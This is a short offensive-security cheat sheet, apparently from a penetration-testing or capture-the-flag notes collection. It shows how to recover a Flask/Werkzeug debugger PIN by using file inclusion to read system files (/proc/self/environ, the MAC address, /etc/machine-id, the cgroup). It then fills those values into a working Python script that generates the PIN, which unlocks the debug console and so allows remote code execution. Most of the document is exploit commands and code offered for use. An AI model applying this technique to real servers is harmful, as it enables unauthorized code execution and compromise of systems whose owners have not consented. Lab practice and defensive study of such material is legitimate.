---
title: "Retrieve Flask Debug Pin"
date: 2024-7-12
tags: ["Local File Inclusion", "Web Exploitation", "Credential Dumping", "Python", "Flask", "Werkzeug", "Debug", "LFI"]
---

### Retrieve Flask Debug Pin

#### 1. Get user

```console
cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
```

```console {class="sample-code"}
$ cat /proc/self/environ        
LANG=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/var/www
LOGNAME=www-data
USER=www-data
...[SNIP]...

$ cat /proc/self/environ | grep -aE ('USER'|'LOGNAME')
LOGNAME=www-data
USER=www-data
```

#### 2. Get full path of the application

```console
+------------------------------+
| Get from Traceback debug log |
+------------------------------+
```

```console {class="sample-code"}
Traceback (most recent call last)
    File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2528, in wsgi_app
    response = self.handle_exception(e)
...[SNIP]...
```

#### 3. Get MAC address

```console
cat /sys/class/net/eth0/address
```

```console {class="sample-code"}
$ cat /sys/class/net/eth0/address
00:50:56:b9:2e:50
```

```console
# Convert to int
python3 -c "print(int('<MAC_ADDRESS>'.replace(':',''), 16))"
```

```console {class="sample-code"}
$ python3 -c "print(int('00:50:56:b9:2e:50'.replace(':',''), 16))"
345052360272
```

#### 4. Create Machine ID String

```console
echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev)
```

```console {class="sample-code"}
$ cat /etc/machine-id
ed5b159560f54721827644bc9b220d00

$ cat /proc/self/cgroup
0::/system.slice/superpass.service

$ head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev
superpass.service

$ echo $(cat /etc/machine-id)$(head -n 1 /proc/self/cgroup | rev | cut -d '/' -f1 | rev)
ed5b159560f54721827644bc9b220d00superpass.service
```

#### 5. Update public and private bits in Hacktrick's Script

```python
#!/usr/bin/env python3

import hashlib
from itertools import chain

probably_public_bits = [
    'user',       # username
    'flask.app',  # modname (should be flask.app)
    'Flask',      # Flask / wsgi_app / DebuggedApplication
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # full path of the app
]

private_bits = [
    '279275995014060',                  # Mac address
    'd4e6cb65d59544f3331ea0425dc555a1'  # machine_id string
]

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

```console {class="sample-code"}
#!/usr/bin/env python3

import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',   # username
    'flask.app',  # modname (should be flask.app)
    'wsgi_app',   # Flask / wsgi_app / DebuggedApplication
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # full path of the app
]

private_bits = [
    '345052360272',                  # Mac address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # machine_id string
]

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```